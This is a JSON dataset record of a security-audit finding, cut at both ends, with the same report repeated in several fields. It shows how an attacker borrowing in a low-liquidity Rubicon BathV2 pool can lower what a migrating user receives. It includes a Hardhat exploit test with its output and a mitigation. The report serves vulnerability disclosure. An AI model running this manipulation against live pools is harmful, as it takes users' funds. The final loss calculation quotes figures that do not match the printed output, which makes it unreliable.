are migrating from one type of token to another, knowing that the liquidity of the pool is low.\n\nThe following script shows how an attacker is able to manipulate the price of the V2 token by borrowing in the same market. The output shows both scenarios, when the price is manipulated and when it is under normal conditions.\n\n```ts\n  it(\"can manipulate the migration yield\", async function () {\n    const { testCoin, migrator, bathTokenV1, bathTokenV2, owner, otherAccount, comptroller } = await loadFixture(\n      deployBathTokensFixture\n    );\n    // *** POOLS UTILITY\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n    await priceOracle.addCtoken(testCoin.address, parseUnits(\"1\", 30));\n    await priceOracle.addCtoken(bathTokenV2.address, parseUnits(\"1\", 30));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n    await comptroller._supportMarket(bathTokenV2.address)\n\n    await comptroller._setCollateralFactor(\n      bathTokenV2.address,\n      parseUnits(\"0.9\", 18)\n    ); // 90% of collateral is borrowable\n    await comptroller._setBorrowPaused(bathTokenV2.address, false)\n\n    const simulatedFlashloanAmount = 10_000_000\n    await testCoin.connect(otherAccount).faucetWithAmountUnchecked(simulatedFlashloanAmount); // 10MM flashloan of testCoins\n    const initialTestBalance = await testCoin.balanceOf(otherAccount.address)\n    console.log(`Initial - TestCoin Balance [Attacker]: ${initialTestBalance}`)\n\n    // A big borrow lands before the migration\n    await testCoin.connect(otherAccount).approve(bathTokenV2.address, initialTestBalance);\n    await bathTokenV2.connect(otherAccount).mint(initialTestBalance);\n    console.log(`\\nBefore Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n    await bathTokenV2.connect(otherAccount).borrow(initialTestBalance.mul(89).div(100));\n    console.log(`After Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n\n    // ======= Comment/Uncomment this for the manipulated scenario ===========\n    // await testCoin.connect(otherAccount).approve(bathTokenV2.address, ethers.constants.MaxUint256);\n    // await bathTokenV2.connect(otherAccount).repayBorrow((await testCoin.balanceOf(otherAccount.address)))\n    // =======================================================================\n\n    // bath balance before migration\n    const bathTokenV1BalanceBefore = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceBefore = await bathTokenV2.balanceOf(owner.address);\n    console.log(`\\nBefore Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceBefore}`)\n    console.log(`Before Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceBefore}`)\n\n    await bathTokenV1.approve(migrator.address, bathTokenV1BalanceBefore);\n    await migrator.migrate(bathTokenV1.address);\n\n    // bath balance after migration\n    const bathTokenV1BalanceAfter = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceAfter = await bathTokenV2.balanceOf(owner.address);\n\n    console.log(`\\nAfter Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceAfter}`)\n    console.log(`After Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceAfter}`)\n\n    const underlyingBalanceBefore = await testCoin.balanceOf(owner.address);\n    await bathTokenV2.approve(bathTokenV2.address, bathTokenV2BalanceAfter);\n    await bathTokenV2.redeem(bathTokenV2BalanceAfter);\n    const underlyingBalanceAfter = await testCoin.balanceOf(owner.address);\n    console.log(`\\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: ${underlyingBalanceAfter}`)\n    console.log(`After Redemption - BathTokenV2 Balance [Victim]: ${await bathTokenV2.balanceOf(owner.address)}`)\n  });\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITHOUT REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995505034745960181\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITH REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995500999977864007\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\nIt is simulated the amount of underlying tokens that the victim would receive in either cases. The difference between the scenario A and B (without repayment and repaying the borrow) is: `WITHOUT_REPAYING - WITH_REPAYMENT = 19899995499999977864007 - 19899995504034745960181 = -4034768096174`, considering that the `TestCoin` has 8 decimals and is a valuable token (like `WBTC`) the loss of migrating will mean `40347` of tokens even if the price is 1 USD per token, the loss is considerable.\n\n## Tools used\nManual review\n\n## Mitigation\nSimulate the amount of underlying tokens users would get if they redeem the whole `BathV2` amount immediately after migrating and allow users to set up a slippage on the amount of underlying tokens they would get (comparing against the simulated amount)\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/V2Migrator.sol#L38\n\n\n# Vulnerability details\n\n## Impact\nIt is possible to manipulate the price of BathV2 tokens before a migration and consequently the migrator will receive underpriced V2 tokens, incurring losses. \n\nThe migration process of `V2Migrator.migrate()` hands in the user's `BathV1` balance in exchange of its underlying. Then, proceeds to mint the counterpart of `BathV2` tokens providing the same amount of recovered underlying tokens:\n\n```solidity\nfunction migrate(IBathToken bathTokenV1) external {\n    //////////////// V1 WITHDRAWAL ////////////////\n    uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n    require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n    /// @dev approve first\n    bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n    // withdraw all tokens from the pool\n    uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n    //////////////// V2 DEPOSIT ////////////////\n    IERC20 underlying = bathTokenV1.underlyingToken();\n    address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n    underlying.approve(bathTokenV2, amountWithdrawn);\n    require(\n        CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n        \"migrate: MINT FAILED\"\n    );\n    /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n    IERC20(bathTokenV2).transfer(\n        msg.sender,\n        IERC20(bathTokenV2).balanceOf(address(this))\n    );\n    ...\n}\n```\nThis process can be abused from external actors when the V2 pool has low liquidity to manipulate the price of the V2 tokens considerably changing the amount of V2 tokens received by the migrating user.\n\nThe amount of V2 tokens (`CTokens`) that are minted are calculated after accruing the respective interests in `CToken.mintFresh()`:\n\n```solidity\nfunction mintFresh(address minter, uint mintAmount) internal {\n    // ... minting checks  ...\n\n    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});\n\n    uint mintTokens = div_(actualMintAmount, exchangeRate);\n\n    /*\n    * We calculate the new total supply of cTokens and minter token balance, checking for overflow:\n    *  totalSupplyNew = totalSupply + mintTokens\n    *  accountTokensNew = accountTokens[minter] + mintTokens\n    * And write them into storage\n    */\n    totalSupply = totalSupply + mintTokens;\n    accountTokens[minter] = accountTokens[minter] + mintTokens;\n\n    /* We emit a Mint event, and a Transfer event */\n    emit Mint(minter, actualMintAmount, mintTokens);\n    emit Transfer(address(this), minter, mintTokens);\n\n    /* We call the defense hook */\n    // unused function\n    // comptroller.mintVerify(address(this), minter, actualMintAmount, mintTokens);\n\n}\n```\nAn attacker is able to manipulate the `exchangeRate` so it harms the subsequent minters:\n\n```solidity\nfunction exchangeRateStoredInternal() virtual internal view returns (uint) {\n    uint _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n        /*\n            * If there are no tokens minted:\n            *  exchangeRate = initialExchangeRate\n            */\n        return initialExchangeRateMantissa;\n    } else {\n        /*\n            * Otherwise:\n            *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n            */\n        uint totalCash = getCashPrior();\n        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;\n        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;\n\n        return exchangeRate;\n    }\n}\n```\n\nEssentially, more tokens will be minted if the rate is decreased as it is dividing the `actualMintAmount`, which could be done by increasing the `totalSupply`. The opposite effect can be done by increasing the `totalCash` or the `totalBorrows`, for example.\n\n## Proof of Concept\nThis scenario can be abused by attackers willing to harm other users that are migrating from one type of token to another, knowing that the liquidity of the pool is low.\n\nThe following script shows how an attacker is able to manipulate the price of the V2 token by borrowing in the same market. The output shows both scenarios, when the price is manipulated and when it is under normal conditions.\n\n```ts\n  it(\"can manipulate the migration yield\", async function () {\n    const { testCoin, migrator, bathTokenV1, bathTokenV2, owner, otherAccount, comptroller } = await loadFixture(\n      deployBathTokensFixture\n    );\n    // *** POOLS UTILITY\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n    await priceOracle.addCtoken(testCoin.address, parseUnits(\"1\", 30));\n    await priceOracle.addCtoken(bathTokenV2.address, parseUnits(\"1\", 30));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n    await comptroller._supportMarket(bathTokenV2.address)\n\n    await comptroller._setCollateralFactor(\n      bathTokenV2.address,\n      parseUnits(\"0.9\", 18)\n    ); // 90% of collateral is borrowable\n    await comptroller._setBorrowPaused(bathTokenV2.address, false)\n\n    const simulatedFlashloanAmount = 10_000_000\n    await testCoin.connect(otherAccount).faucetWithAmountUnchecked(simulatedFlashloanAmount); // 10MM flashloan of testCoins\n    const initialTestBalance = await testCoin.balanceOf(otherAccount.address)\n    console.log(`Initial - TestCoin Balance [Attacker]: ${initialTestBalance}`)\n    \n    // A big borrow lands before the migration\n    await testCoin.connect(otherAccount).approve(bathTokenV2.address, initialTestBalance);\n    await bathTokenV2.connect(otherAccount).mint(initialTestBalance);\n    console.log(`\\nBefore Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n    await bathTokenV2.connect(otherAccount).borrow(initialTestBalance.mul(89).div(100));\n    console.log(`After Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n\n    // ======= Comment/Uncomment this for the manipulated scenario ===========\n    // await testCoin.connect(otherAccount).approve(bathTokenV2.address, ethers.constants.MaxUint256);\n    // await bathTokenV2.connect(otherAccount).repayBorrow((await testCoin.balanceOf(otherAccount.address)))\n    // =======================================================================\n\n    // bath balance before migration\n    const bathTokenV1BalanceBefore = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceBefore = await bathTokenV2.balanceOf(owner.address);\n    console.log(`\\nBefore Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceBefore}`)\n    console.log(`Before Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceBefore}`)\n\n    await bathTokenV1.approve(migrator.address, bathTokenV1BalanceBefore);\n    await migrator.migrate(bathTokenV1.address);\n\n    // bath balance after migration\n    const bathTokenV1BalanceAfter = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceAfter = await bathTokenV2.balanceOf(owner.address);\n\n    console.log(`\\nAfter Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceAfter}`)\n    console.log(`After Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceAfter}`)\n\n    const underlyingBalanceBefore = await testCoin.balanceOf(owner.address);\n    await bathTokenV2.approve(bathTokenV2.address, bathTokenV2BalanceAfter);\n    await bathTokenV2.redeem(bathTokenV2BalanceAfter);\n    const underlyingBalanceAfter = await testCoin.balanceOf(owner.address);\n    console.log(`\\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: ${underlyingBalanceAfter}`)\n    console.log(`After Redemption - BathTokenV2 Balance [Victim]: ${await bathTokenV2.balanceOf(owner.address)}`)\n  });\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITHOUT REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995505034745960181\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITH REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995500999977864007\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\nIt is simulated the amount of underlying tokens that the victim would receive in either cases. The difference between the scenario A and B (without repayment and repaying the borrow) is: `WITHOUT_REPAYING - WITH_REPAYMENT = 19899995499999977864007 - 19899995504034745960181 = -4034768096174`, considering that the `TestCoin` has 8 decimals and is a valuable token (like `WBTC`) the loss of migrating will mean `40347` of tokens even if the price is 1 USD per token, the loss is considerable.\n\n## Tools used\nManual review\n\n## Mitigation\nSimulate the amount of underlying tokens users would get if they redeem the whole `BathV2` amount immediately after migrating and allow users to set up a slippage on the amount of underlying tokens they would get (comparing against the simulated amount)",
      "description": null,
      "impact": "## Impact\nIt is possible to manipulate the price of BathV2 tokens before a migration and consequently the migrator will receive underpriced V2 tokens, incurring losses.\n\nThe migration process of `V2Migrator.migrate()` hands in the user's `BathV1` balance in exchange of its underlying. Then, proceeds to mint the counterpart of `BathV2` tokens providing the same amount of recovered underlying tokens:\n\n```solidity\nfunction migrate(IBathToken bathTokenV1) external {\n    //////////////// V1 WITHDRAWAL ////////////////\n    uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n    require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n    /// @dev approve first\n    bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n    // withdraw all tokens from the pool\n    uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n    //////////////// V2 DEPOSIT ////////////////\n    IERC20 underlying = bathTokenV1.underlyingToken();\n    address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n    underlying.approve(bathTokenV2, amountWithdrawn);\n    require(\n        CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n        \"migrate: MINT FAILED\"\n    );\n    /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n    IERC20(bathTokenV2).transfer(\n        msg.sender,\n        IERC20(bathTokenV2).balanceOf(address(this))\n    );\n    ...\n}\n```\nThis process can be abused from external actors when the V2 pool has low liquidity to manipulate the price of the V2 tokens considerably changing the amount of V2 tokens received by the migrating user.\n\nThe amount of V2 tokens (`CTokens`) that are minted are calculated after accruing the respective interests in `CToken.mintFresh()`:\n\n```solidity\nfunction mintFresh(address minter, uint mintAmount) internal {\n    // ... minting checks  ...\n\n    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});\n\n    uint mintTokens = div_(actualMintAmount, exchangeRate);\n\n    /*\n    * We calculate the new total supply of cTokens and minter token balance, checking for overflow:\n    *  totalSupplyNew = totalSupply + mintTokens\n    *  accountTokensNew = accountTokens[minter] + mintTokens\n    * And write them into storage\n    */\n    totalSupply = totalSupply + mintTokens;\n    accountTokens[minter] = accountTokens[minter] + mintTokens;\n\n    /* We emit a Mint event, and a Transfer event */\n    emit Mint(minter, actualMintAmount, mintTokens);\n    emit Transfer(address(this), minter, mintTokens);\n\n    /* We call the defense hook */\n    // unused function\n    // comptroller.mintVerify(address(this), minter, actualMintAmount, mintTokens);\n\n}\n```\nAn attacker is able to manipulate the `exchangeRate` so it harms the subsequent minters:\n\n```solidity\nfunction exchangeRateStoredInternal() virtual internal view returns (uint) {\n    uint _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n        /*\n            * If there are no tokens minted:\n            *  exchangeRate = initialExchangeRate\n            */\n        return initialExchangeRateMantissa;\n    } else {\n        /*\n            * Otherwise:\n            *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n            */\n        uint totalCash = getCashPrior();\n        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;\n        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;\n\n        return exchangeRate;\n    }\n}\n```\n\nEssentially, more tokens will be minted if the rate is decreased as it is dividing the `actualMintAmount`, which could be done by increasing the `totalSupply`. The opposite effect can be done by increasing the `totalCash` or the `totalBorrows`, for example.\n",
      "mitigation": "## Mitigation\nSimulate the amount of underlying tokens users would get if they redeem the whole `BathV2` amount immediately after migrating and allow users to set up a slippage on the amount of underlying tokens they would get (comparing against the simulated amount)\n",
      "poc": "## Proof of Concept\nThis scenario can be abused by attackers willing to harm other users that are migrating from one type of token to another, knowing that the liquidity of the pool is low.\n\nThe following script shows how an attacker is able to manipulate the price of the V2 token by borrowing in the same market. The output shows both scenarios, when the price is manipulated and when it is under normal conditions.\n\n```ts\n  it(\"can manipulate the migration yield\", async function () {\n    const { testCoin, migrator, bathTokenV1, bathTokenV2, owner, otherAccount, comptroller } = await loadFixture(\n      deployBathTokensFixture\n    );\n    // *** POOLS UTILITY\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n    await priceOracle.addCtoken(testCoin.address, parseUnits(\"1\", 30));\n    await priceOracle.addCtoken(bathTokenV2.address, parseUnits(\"1\", 30));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n    await comptroller._supportMarket(bathTokenV2.address)\n\n    await comptroller._setCollateralFactor(\n      bathTokenV2.address,\n      parseUnits(\"0.9\", 18)\n    ); // 90% of collateral is borrowable\n    await comptroller._setBorrowPaused(bathTokenV2.address, false)\n\n    const simulatedFlashloanAmount = 10_000_000\n    await testCoin.connect(otherAccount).faucetWithAmountUnchecked(simulatedFlashloanAmount); // 10MM flashloan of testCoins\n    const initialTestBalance = await testCoin.balanceOf(otherAccount.address)\n    console.log(`Initial - TestCoin Balance [Attacker]: ${initialTestBalance}`)\n\n    // A big borrow lands before the migration\n    await testCoin.connect(otherAccount).approve(bathTokenV2.address, initialTestBalance);\n    await bathTokenV2.connect(otherAccount).mint(initialTestBalance);\n    console.log(`\\nBefore Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n    await bathTokenV2.connect(otherAccount).borrow(initialTestBalance.mul(89).div(100));\n    console.log(`After Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n\n    // ======= Comment/Uncomment this for the manipulated scenario ===========\n    // await testCoin.connect(otherAccount).approve(bathTokenV2.address, ethers.constants.MaxUint256);\n    // await bathTokenV2.connect(otherAccount).repayBorrow((await testCoin.balanceOf(otherAccount.address)))\n    // =======================================================================\n\n    // bath balance before migration\n    const bathTokenV1BalanceBefore = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceBefore = await bathTokenV2.balanceOf(owner.address);\n    console.log(`\\nBefore Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceBefore}`)\n    console.log(`Before Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceBefore}`)\n\n    await bathTokenV1.approve(migrator.address, bathTokenV1BalanceBefore);\n    await migrator.migrate(bathTokenV1.address);\n\n    // bath balance after migration\n    const bathTokenV1BalanceAfter = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceAfter = await bathTokenV2.balanceOf(owner.address);\n\n    console.log(`\\nAfter Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceAfter}`)\n    console.log(`After Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceAfter}`)\n\n    const underlyingBalanceBefore = await testCoin.balanceOf(owner.address);\n    await bathTokenV2.approve(bathTokenV2.address, bathTokenV2BalanceAfter);\n    await bathTokenV2.redeem(bathTokenV2BalanceAfter);\n    const underlyingBalanceAfter = await testCoin.balanceOf(owner.address);\n    console.log(`\\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: ${underlyingBalanceAfter}`)\n    console.log(`After Redemption - BathTokenV2 Balance [Victim]: ${await bathTokenV2.balanceOf(owner.address)}`)\n  });\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITHOUT REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995505034745960181\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITH REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995500999977864007\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\nIt is simulated the amount of underlying tokens that the victim would receive in either cases. The difference between the scenario A and B (without repayment and repaying the borrow) is: `WITHOUT_REPAYING - WITH_REPAYMENT = 19899995499999977864007 - 19899995504034745960181 = -4034768096174`, considering that the `TestCoin` has 8 decimals and is a valuable token (like `WBTC`) the loss of migrating will mean `40347` of tokens even if the price is 1 USD per token, the loss is considerable.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/V2Migrator.sol#L38\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools used\nManual review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nIt is possible to manipulate the price of BathV2 tokens before a migration and consequently the migrator will receive underpriced V2 tokens, incurring losses.\n\nThe migration process of `V2Migrator.migrate()` hands in the user's `BathV1` balance in exchange of its underlying. Then, proceeds to mint the counterpart of `BathV2` tokens providing the same amount of recovered underlying tokens:\n\n```solidity\nfunction migrate(IBathToken bathTokenV1) external {\n    //////////////// V1 WITHDRAWAL ////////////////\n    uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n    require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n    /// @dev approve first\n    bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n    // withdraw all tokens from the pool\n    uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n    //////////////// V2 DEPOSIT ////////////////\n    IERC20 underlying = bathTokenV1.underlyingToken();\n    address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n    underlying.approve(bathTokenV2, amountWithdrawn);\n    require(\n        CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n        \"migrate: MINT FAILED\"\n    );\n    /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n    IERC20(bathTokenV2).transfer(\n        msg.sender,\n        IERC20(bathTokenV2).balanceOf(address(this))\n    );\n    ...\n}\n```\nThis process can be abused from external actors when the V2 pool has low liquidity to manipulate the price of the V2 tokens considerably changing the amount of V2 tokens received by the migrating user.\n\nThe amount of V2 tokens (`CTokens`) that are minted are calculated after accruing the respective interests in `CToken.mintFresh()`:\n\n```solidity\nfunction mintFresh(address minter, uint mintAmount) internal {\n    // ... minting checks  ...\n\n    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});\n\n    uint mintTokens = div_(actualMintAmount, exchangeRate);\n\n    /*\n    * We calculate the new total supply of cTokens and minter token balance, checking for overflow:\n    *  totalSupplyNew = totalSupply + mintTokens\n    *  accountTokensNew = accountTokens[minter] + mintTokens\n    * And write them into storage\n    */\n    totalSupply = totalSupply + mintTokens;\n    accountTokens[minter] = accountTokens[minter] + mintTokens;\n\n    /* We emit a Mint event, and a Transfer event */\n    emit Mint(minter, actualMintAmount, mintTokens);\n    emit Transfer(address(this), minter, mintTokens);\n\n    /* We call the defense hook */\n    // unused function\n    // comptroller.mintVerify(address(this), minter, actualMintAmount, mintTokens);\n\n}\n```\nAn attacker is able to manipulate the `exchangeRate` so it harms the subsequent minters:\n\n```solidity\nfunction exchangeRateStoredInternal() virtual internal view returns (uint) {\n    uint _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n        /*\n            * If there are no tokens minted:\n            *  exchangeRate = initialExchangeRate\n            */\n        return initialExchangeRateMantissa;\n    } else {\n        /*\n            * Otherwise:\n            *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n            */\n        uint totalCash = getCashPrior();\n        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;\n        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;\n\n        return exchangeRate;\n    }\n}\n```\n\nEssentially, more tokens will be minted if the rate is decreased as it is dividing the `actualMintAmount`, which could be done by increasing the `totalSupply`. The opposite effect can be done by increasing the `totalCash` or the `totalBorrows`, for example.\n",
        "recommendation": "## Mitigation\nSimulate the amount of underlying tokens users would get if they redeem the whole `BathV2` amount immediately after migrating and allow users to set up a slippage on the amount of underlying tokens they would get (comparing against the simulated amount)\n",
        "poc": "## Proof of Concept\nThis scenario can be abused by attackers willing to harm other users that are migrating from one type of token to another, knowing that the liquidity of the pool is low.\n\nThe following script shows how an attacker is able to manipulate the price of the V2 token by borrowing in the same market. The output shows both scenarios, when the price is manipulated and when it is under normal conditions.\n\n```ts\n  it(\"can manipulate the migration yield\", async function () {\n    const { testCoin, migrator, bathTokenV1, bathTokenV2, owner, otherAccount, comptroller } = await loadFixture(\n      deployBathTokensFixture\n    );\n    // *** POOLS UTILITY\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n    await priceOracle.addCtoken(testCoin.address, parseUnits(\"1\", 30));\n    await priceOracle.addCtoken(bathTokenV2.address, parseUnits(\"1\", 30));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n    await comptroller._supportMarket(bathTokenV2.address)\n\n    await comptroller._setCollateralFactor(\n      bathTokenV2.address,\n      parseUnits(\"0.9\", 18)\n    ); // 90% of collateral is borrowable\n    await comptroller._setBorrowPaused(bathTokenV2.address, false)\n\n    const simulatedFlashloanAmount = 10_000_000\n    await testCoin.connect(otherAccount).faucetWithAmountUnchecked(simulatedFlashloanAmount); // 10MM flashloan of testCoins\n    const initialTestBalance = await testCoin.balanceOf(otherAccount.address)\n    console.log(`Initial - TestCoin Balance [Attacker]: ${initialTestBalance}`)\n\n    // A big borrow lands before the migration\n    await testCoin.connect(otherAccount).approve(bathTokenV2.address, initialTestBalance);\n    await bathTokenV2.connect(otherAccount).mint(initialTestBalance);\n    console.log(`\\nBefore Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n    await bathTokenV2.connect(otherAccount).borrow(initialTestBalance.mul(89).div(100));\n    console.log(`After Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n\n    // ======= Comment/Uncomment this for the manipulated scenario ===========\n    // await testCoin.connect(otherAccount).approve(bathTokenV2.address, ethers.constants.MaxUint256);\n    // await bathTokenV2.connect(otherAccount).repayBorrow((await testCoin.balanceOf(otherAccount.address)))\n    // =======================================================================\n\n    // bath balance before migration\n    const bathTokenV1BalanceBefore = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceBefore = await bathTokenV2.balanceOf(owner.address);\n    console.log(`\\nBefore Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceBefore}`)\n    console.log(`Before Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceBefore}`)\n\n    await bathTokenV1.approve(migrator.address, bathTokenV1BalanceBefore);\n    await migrator.migrate(bathTokenV1.address);\n\n    // bath balance after migration\n    const bathTokenV1BalanceAfter = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceAfter = await bathTokenV2.balanceOf(owner.address);\n\n    console.log(`\\nAfter Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceAfter}`)\n    